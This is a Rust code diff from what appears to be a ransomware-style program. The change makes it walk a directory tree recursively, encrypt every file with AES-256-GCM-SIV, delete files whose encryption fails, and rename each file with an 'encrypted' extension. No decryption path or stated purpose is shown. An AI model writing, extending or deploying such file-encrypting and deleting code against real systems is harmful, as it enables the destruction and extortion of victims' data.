@@ -3,6 +3,7 @@ use aes_gcm_siv::aead::{Aead, NewAead};
 use aes_gcm_siv::{Aes256GcmSiv, Key, Nonce};
 use encryption::encryptor;
 use encryption::key_gen;
+use fs_extra;
 use rand::prelude::*;
 use rand_hc::Hc128Rng;
 use std::fs;
@@ -18,25 +19,26 @@ fn main() {
 
     let encryptor = encryptor::Encryptor::from(key_bytes, nonce_bytes);
 
-    let files = fs::read_dir("files").unwrap();
-
-    encrypt_files_in_dir(files, encryptor);
+    encrypt_dir(&String::from("files"), &encryptor);
+    //encrypt_files_in_dir(files, encryptor);
 }
 
-fn encrypt_files_in_dir(dir: fs::ReadDir, encryptor: encryptor::Encryptor) {
-    for path in dir {
-        let file_path = match path {
-            Ok(path) => path.path(),
-            Err(_) => continue,
-        };
+fn encrypt_dir(dir: &String, encryptor: &encryptor::Encryptor) -> bool {
+    let files = match fs_extra::dir::get_dir_content(&dir) {
+        Ok(content) => content.files,
+        Err(_) => return false,
+    };
 
-        println!("Name: {}", file_path.display());
-        encryptor.encrypt_file_else_delete(&file_path);
+    encrypt_files(&files, encryptor);
+    true
+}
 
-        match fs::rename(
-            &file_path,
-            file_path.display().to_string() + ENCRYPTED_EXTENSION,
-        ) {
+fn encrypt_files(files: &Vec<String>, encryptor: &encryptor::Encryptor) {
+    for file in files {
+        println!("Name: {}", &file);
+        encryptor.encrypt_file_else_delete(&file);
+
+        match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
             Ok(_) => (),
             Err(_) => (),
         };
